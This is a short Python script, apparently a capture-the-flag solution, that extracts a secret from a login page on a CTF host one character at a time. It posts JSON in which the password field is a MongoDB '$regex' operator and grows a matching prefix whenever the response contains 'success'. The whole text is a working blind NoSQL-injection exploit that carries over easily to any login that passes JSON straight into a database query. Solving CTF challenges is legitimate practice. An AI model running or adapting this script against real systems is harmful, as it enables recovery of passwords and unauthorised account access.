import requests
import string

url = 'http://logintest.ctf.devcore.tw:1337/login' 
flag = '^DEVCORE{youtu'
special = '.?+-*|^\\()[]'
print(flag)
while True:
    for s in string.printable:
        if s not in special:
            test = flag + s
        else:
            test = flag + '\\' + s
        data = {'username': 'admin', 'password': {'$regex': test}}
        r = requests.post(url, json=data)
        if 'success' in r.text:
            flag = test
            print(flag)
            break
